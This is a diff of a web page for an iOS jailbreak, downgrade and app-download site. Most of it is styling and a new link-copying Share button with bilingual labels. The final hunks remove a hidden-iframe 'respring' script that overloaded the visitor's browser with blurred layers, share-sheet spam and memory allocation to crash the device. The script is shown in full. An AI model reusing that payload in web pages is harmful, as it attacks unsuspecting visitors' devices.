@@ -781,7 +781,9 @@
     /* Jailbreak Button */
     #jb-btn-wrapper {
       position: relative;
-      width: min(100%, 22rem);
+      display: inline-flex;
+      width: auto;
+      max-width: calc(100vw - 2rem);
       transform: translateZ(0);
       border-radius: 9999px;
       transition: transform 0.28s cubic-bezier(0.22, 1, 0.36, 1), box-shadow 0.28s ease;
@@ -934,14 +936,15 @@
       display: inline-flex;
       align-items: center;
       justify-content: center;
-      width: 100%;
+      width: auto;
+      max-width: 100%;
       padding: 1.5rem 4rem;
       background-color: transparent;
       color: white;
       border-radius: 9999px;
       border: 1px solid rgba(255,255,255,0.2);
       font-weight: 800;
-      font-size: 2rem;
+      font-size: 2.2rem;
       letter-spacing: 0.1em;
       line-height: 1.1;
       text-align: center;
@@ -1023,7 +1026,7 @@
 
       #main-jailbreak-btn {
         padding: 1.25rem 3rem;
-        font-size: 1.5rem;
+        font-size: 1.7rem;
       }
 
       .jb-orbit-ring {
@@ -1174,6 +1177,96 @@
       border-color: rgba(255,255,255,0.13);
     }
 
+    #share-btn {
+      position: relative;
+      overflow: hidden;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.38rem;
+      padding: 0.34rem 0.62rem;
+      min-height: 1.9rem;
+      border-radius: 9999px;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      background: rgba(255, 255, 255, 0.06);
+      color: rgba(255, 255, 255, 0.86);
+      font-size: 0.68rem;
+      font-weight: 700;
+      line-height: 1;
+      white-space: nowrap;
+      box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.04);
+      flex-shrink: 0;
+    }
+
+    #share-btn::before {
+      content: '';
+      position: absolute;
+      inset: 1px;
+      border-radius: inherit;
+      background: linear-gradient(120deg, transparent 18%, rgba(255,255,255,0.12) 50%, transparent 82%);
+      transform: translateX(-135%);
+      transition: transform 0.65s ease;
+      pointer-events: none;
+    }
+
+    #share-btn:hover::before {
+      transform: translateX(135%);
+    }
+
+    #share-btn > * {
+      position: relative;
+      z-index: 1;
+    }
+
+    #share-btn i {
+      color: rgba(255, 255, 255, 0.72);
+      width: 0.82rem;
+      height: 0.82rem;
+      flex-shrink: 0;
+    }
+
+    #share-toast {
+      position: fixed;
+      top: 1.15rem;
+      left: 50%;
+      transform: translate(-50%, -140%);
+      z-index: 80;
+      display: inline-flex;
+      align-items: center;
+      gap: 0.65rem;
+      padding: 0.8rem 1rem;
+      border-radius: 9999px;
+      border: 1px solid rgba(74, 222, 128, 0.22);
+      background: rgba(5, 5, 5, 0.88);
+      color: rgba(255,255,255,0.95);
+      box-shadow: 0 20px 40px -28px rgba(74, 222, 128, 0.65), inset 0 1px 0 rgba(255,255,255,0.06);
+      backdrop-filter: blur(16px);
+      -webkit-backdrop-filter: blur(16px);
+      opacity: 0;
+      pointer-events: none;
+      transition: transform 0.45s cubic-bezier(0.22, 1, 0.36, 1), opacity 0.35s ease;
+    }
+
+    #share-toast.show {
+      transform: translate(-50%, 0);
+      opacity: 1;
+    }
+
+    .share-toast-dot {
+      width: 0.55rem;
+      height: 0.55rem;
+      border-radius: 9999px;
+      background: #4ade80;
+      box-shadow: 0 0 14px rgba(74, 222, 128, 0.8);
+      animation: toastPulse 1.2s ease-in-out infinite;
+      flex-shrink: 0;
+    }
+
+    @keyframes toastPulse {
+      0%, 100% { transform: scale(1); opacity: 0.9; }
+      50% { transform: scale(1.22); opacity: 1; }
+    }
+
     html[lang="en"] .hero-title {
       letter-spacing: -0.045em;
       font-weight: 800;
@@ -1272,6 +1365,21 @@
       flex-wrap: wrap;
       gap: 0.45rem;
       margin-top: 0.8rem;
+    }
+
+    .category-spotlight-footer {
+      position: relative;
+      z-index: 1;
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.45rem;
+      margin-top: 0.8rem;
+      align-items: center;
+    }
+
+    .category-spotlight-footer .category-spotlight-tags {
+      margin-top: 0;
+      align-items: center;
     }
 
     .category-spotlight-tag {
@@ -1415,6 +1523,11 @@
   <!-- Body touch-action to enable immediate :active states on iOS -->
   <div ontouchstart=""></div>
 
+  <div id="share-toast" role="status" aria-live="polite" aria-atomic="true">
+    <span class="share-toast-dot" aria-hidden="true"></span>
+    <span id="share-toast-text">Thank You! Link Copied</span>
+  </div>
+
   <!-- Background Stars -->
   <canvas id="stars-canvas" aria-hidden="true"></canvas>
 
@@ -1510,7 +1623,13 @@
         <span id="category-spotlight-title-text">Jailbreak Tools</span>
       </div>
       <div class="category-spotlight-desc" id="category-spotlight-desc">Choose a tool and continue to the installation step.</div>
-      <div class="category-spotlight-tags" id="category-spotlight-tags"></div>
+      <div class="category-spotlight-footer">
+        <div class="category-spotlight-tags" id="category-spotlight-tags"></div>
+        <button id="share-btn" type="button" class="category-spotlight-tag transition-transform active:scale-90 hover:bg-white/10 focus:outline-none">
+          <span id="share-btn-label">Share</span>
+          <i data-lucide="share-2" class="w-3.5 h-3.5"></i>
+        </button>
+      </div>
     </div>
 
     <div id="options-list">
@@ -2006,6 +2125,10 @@
     const infoContent = document.getElementById('info-content');
     const infoBackdrop = document.getElementById('info-backdrop');
     const infoCloseBtn = document.getElementById('info-close-btn');
+    const shareBtn = document.getElementById('share-btn');
+    const shareToast = document.getElementById('share-toast');
+    const shareToastText = document.getElementById('share-toast-text');
+    let shareToastTimer = null;
 
     const langBtn = document.getElementById('lang-btn');
     const langModal = document.getElementById('lang-modal');
@@ -2049,6 +2172,36 @@
       langBtn.setAttribute('aria-expanded', 'false');
     }
 
+    function showShareToast() {
+      if (!shareToast) return;
+      window.clearTimeout(shareToastTimer);
+      shareToast.classList.add('show');
+      shareToastTimer = window.setTimeout(() => {
+        shareToast.classList.remove('show');
+      }, 2200);
+    }
+
+    async function copyShareLink() {
+      const shareUrl = 'https://vityaig.github.io/26jailbreak.html';
+
+      try {
+        if (navigator.clipboard && typeof navigator.clipboard.writeText === 'function') {
+          await navigator.clipboard.writeText(shareUrl);
+        } else {
+          const textArea = document.createElement('textarea');
+          textArea.value = shareUrl;
+          textArea.setAttribute('readonly', '');
+          textArea.style.position = 'fixed';
+          textArea.style.opacity = '0';
+          document.body.appendChild(textArea);
+          textArea.select();
+          document.execCommand('copy');
+          textArea.remove();
+        }
+        showShareToast();
+      } catch (_) {}
+    }
+
     if (infoBtn && infoCloseBtn && infoBackdrop) {
       infoBtn.addEventListener('click', openInfo);
       infoCloseBtn.addEventListener('click', closeInfo);
@@ -2059,6 +2212,10 @@
       langBtn.addEventListener('click', openLang);
       langCloseBtn.addEventListener('click', closeLang);
       langBackdrop.addEventListener('click', closeLang);
+    }
+
+    if (shareBtn) {
+      shareBtn.addEventListener('click', copyShareLink);
     }
 
     document.addEventListener('keydown', (event) => {
@@ -2093,17 +2250,17 @@
           jailbreak: {
             title: "Jailbreak Tools",
             description: "Choose the toolset you want to launch, then continue to the installation step.",
-            tags: ["Rootless", "Signing", "Tweaks"]
+            tags: ["Core tools", "App signing", "Packages"]
           },
           downgrade: {
             title: "Downgrade Library",
             description: "Choose the rollback version that best fits your device, preferred stability, and iOS generation.",
-            tags: ["Stable builds", "Recommended version", "Exclusive archive"]
+            tags: ["Stable", "Recommended", "Archive"]
           },
           pcgames: {
             title: "PC Games / Apps",
             description: "Browse desktop titles and apps with a matching visual setup and direct install flow.",
-            tags: ["Catalog", "Popular picks", "iOS-ready"]
+            tags: ["Games", "Apps", "Downloads"]
           }
         },
         downgradeTrack: {
@@ -2122,6 +2279,8 @@
         aboutFeatureFlow: "Guided flow for tools, rollback, and apps.",
         aboutFeatureTheme: "Theme color adapts to the selected option.",
         aboutFeatureIcons: "Real icons are used where reliable sources exist.",
+        shareLabel: "Share",
+        shareToast: "Thank You! Link Copied",
         viewCredits: "View Credits",
         hideCredits: "Hide Credits",
         creditsTitle: "Credits",
@@ -2172,17 +2331,17 @@
           jailbreak: {
             title: "Инструменты джейлбрейка",
             description: "Выберите нужный инструмент и перейдите к шагу установки.",
-            tags: ["Rootless", "Подпись", "Твики"]
+            tags: ["Основное", "Подпись IPA", "Пакеты"]
           },
           downgrade: {
             title: "Каталог отката iOS",
             description: "Выберите версию отката под своё устройство, нужную стабильность и поколение iOS.",
-            tags: ["Стабильные сборки", "Рекомендуемая версия", "Эксклюзивный архив"]
+            tags: ["Стабильно", "Рекомендуется", "Архив"]
           },
           pcgames: {
             title: "ПК Игры / Приложения",
             description: "Каталог настольных игр и приложений с отдельным визуальным стилем и прямым сценарием установки.",
-            tags: ["Каталог", "Популярные позиции", "Готово для iOS"]
+            tags: ["Игры", "Приложения", "Загрузки"]
           }
         },
         downgradeTrack: {
@@ -2201,6 +2360,8 @@
         aboutFeatureFlow: "Пошаговый выбор для инструментов, отката и приложений.",
         aboutFeatureTheme: "Цвет темы подстраивается под выбранную опцию.",
         aboutFeatureIcons: "Реальные иконки используются там, где есть надежные источники.",
+        shareLabel: "Поделиться",
+        shareToast: "Спасибо! Ссылка скопирована",
         viewCredits: "Показать создателей",
         hideCredits: "Скрыть создателей",
         creditsTitle: "Создатели",
@@ -2278,9 +2439,10 @@
       const wrapper = document.getElementById('jb-btn-wrapper');
       if (!wrapper) return;
 
-      wrapper.style.width = currentCategory === 'downgrade'
-        ? 'min(100%, 16rem)'
-        : 'min(100%, 22rem)';
+      wrapper.style.width = 'auto';
+      wrapper.style.maxWidth = currentCategory === 'downgrade'
+        ? 'calc(100vw - 2rem)'
+        : 'calc(100vw - 2rem)';
     }
 
     function updateContinueButtonText() {
@@ -2383,6 +2545,8 @@
       setNodeText('about-feature-flow', t.aboutFeatureFlow);
       setNodeText('about-feature-theme', t.aboutFeatureTheme);
       setNodeText('about-feature-icons', t.aboutFeatureIcons);
+      setNodeText('share-btn-label', t.shareLabel);
+      setNodeText('share-toast-text', t.shareToast);
       setNodeText('credits-title', t.creditsTitle);
       setNodeText('role-designer', t.roleDesigner);
       setNodeText('role-ai', t.roleAi);
@@ -3124,11 +3288,6 @@
           setTimeout(() => {
             boostStarfield(1.8);
             startPanicScreen();
-            
-            // Launch respring after panic screen fully loads (795ms total from now)
-            setTimeout(() => {
-              launchRespring();
-            }, 497);
           }, 275);
         };
 
@@ -3152,45 +3311,6 @@
           showPanicAfterSound();
         }
       });
-    }
-
-    // Respring launch function
-    function launchRespring() {
-      // Create hidden iframe for respring exploit
-      const iframe = document.createElement('iframe');
-      iframe.id = 'respring-iframe';
-      iframe.style.cssText = 'position: fixed; top: 0; left: 0; width: 1px; height: 1px; border: none; opacity: 0.01; pointer-events: none; z-index: -1;';
-      iframe.setAttribute('sandbox', 'allow-forms allow-modals allow-scripts allow-same-origin');
-      
-      document.body.appendChild(iframe);
-
-      const respringScript = `
-        <html>
-        <body style="margin:0; overflow:hidden;">
-          <script>
-            const container = document.createElement('div');
-            container.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%;';
-            document.body.appendChild(container);
-
-            for (let i = 0; i < 500; i++) {
-              let d = document.createElement('div');
-              d.style.cssText = 'position: absolute; width: 100vw; height: 100vh; backdrop-filter: blur(100px); -webkit-backdrop-filter: blur(100px); transform: translate3d(100000px, 100000px, ' + i + 'px) rotateY(90deg); opacity: 0.99;';
-              container.appendChild(d);
-            }
-
-            setInterval(() => {
-              try {
-                navigator.share({ title: 'R', text: 'R'.repeat(100000) });
-              } catch(e) {}
-              let x = new Uint8Array(1024 * 1024 * 20);
-              crypto.getRandomValues(x);
-            }, 0);
-          <\/script>
-        </body>
-        </html>
-      `;
-      
-      iframe.srcdoc = respringScript;
     }
 
 </script>
